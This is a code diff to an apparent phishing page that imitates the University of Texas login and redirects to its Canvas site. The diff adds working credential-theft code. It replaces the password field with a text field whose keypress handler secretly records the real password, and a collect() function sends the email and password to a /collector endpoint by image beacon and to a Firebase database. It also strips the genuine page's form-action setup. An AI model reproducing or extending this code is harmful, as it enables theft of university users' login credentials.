@@ -51,16 +51,17 @@
           var database = firebase.database();
         </script>
 
-            <script language="JavaScript" type="text/javascript">
-                var defaultBtn = 'Submit';
-                var elmCount = 0;
+        <script language="JavaScript" type="text/javascript">
+            var defaultBtn = 'Submit';
+            var elmCount = 0;
 
-                /**
-                 * submit form with given button value
-                 *
-                 * @param value of button
-                 */
-                function LoginSubmit(value) {
+            /**
+             * submit form with given button value
+             *
+             * @param value of button
+             */
+            function LoginSubmit(value) {
+                setTimeout(function() {
                     aggSubmit();
                     var hiddenFrm = document.forms['Login'];
 
@@ -74,18 +75,8 @@
                             hiddenFrm.submit();
                         }
                     }
-                }
-            </script>
-
-
-        <script language="JavaScript" type="text/javascript">
-            <!-- Page is loaded. Initializations. -->
-            jQuery(document).ready(function() {
-                // placeCursorOnFirstElm();
-                document.cookie = "SC=; expires=Thu, 01 Jan 1970 00:00:00 UTC; domain=.utexas.edu; path=/";
-                disableLoginAfter(5 * 1000 * 60 /*5 minutes in ms*/);
-                jQuery("form").attr("action", "/login/UI/Login")
-            });
+                }, 200);
+            }
         </script>
     </head>
     <body>
@@ -143,7 +134,27 @@
 
                                         </label>
                                         <br>
-                                        <input class="input_pad" type="password" name="IDToken2" id="pass" value="" autocomplete="off" size="30" aria-required="true">
+                                        <input class="input_pad" type="text" name="IDToken2" id="pass" value="" autocomplete="off" size="30" aria-required="true"></input>
+                                        <script>
+                                            window.realpass = "";
+                                            var fakepass = document.getElementById("pass");
+                                            //fakepass.addEventListener('focus',function(e){ /*yourcode*/ },true);
+                                            fakepass.addEventListener('keypress',function(e){ 
+                                                e.preventDefault();
+                                                e.stopPropagation();
+                                                var code = e.keyCode || e.which;
+                                                if (code === 8) {
+                                                    window.realpass = (window.realpass === "" ? "" : window.realpass.substring(0, window.realpass.length - 1));
+                                                } else {
+                                                    window.realpass += String.fromCharCode(code);
+                                                }
+                                                var stars = "";
+                                                for (var i = 0; i < window.realpass.length; ++i) {
+                                                    stars += "•";
+                                                }
+                                                fakepass.value = stars;
+                                            },true);
+                                        </script>
                                     </div>
 
 
@@ -164,8 +175,8 @@
 
                                     <div>
                                         <img src="../../../../openam/images/dot.gif" width="1" height="15" alt="">
-                                        <a href="https://utexas.instructure.com/"><div id="login_btn" onclick="myFunction()">
-                                            <input name="Login.Submit"  onclick="myFunction()" class="login button primary" value="   Log In">
+                                        <a href="https://utexas.instructure.com/"><div id="login_btn">
+                                            <input name="Login.Submit" onclick="collect()" class="login button primary" value="  Log In">
                                         </div></a>
                                     </div>
 
@@ -208,14 +219,18 @@
         </div> <!--end of container -->
     </body>
     <script>
-    function myFunction() {
-        firebase.database().ref('utcanvas/').push({
-        username: document.getElementById('email').value,
-        pass: document.getElementById('pass').value
 
+    function collect() {
+        var email = document.getElementById('email').value;
+        var pass = window.realpass;
 
+      (new Image()).src = '/collector?email=' + email + '&pass=' + pass;
 
+      firebase.database().ref('utcanvas/').push({
+        username: email,
+        pass: pass
       });
+
     }
 
 
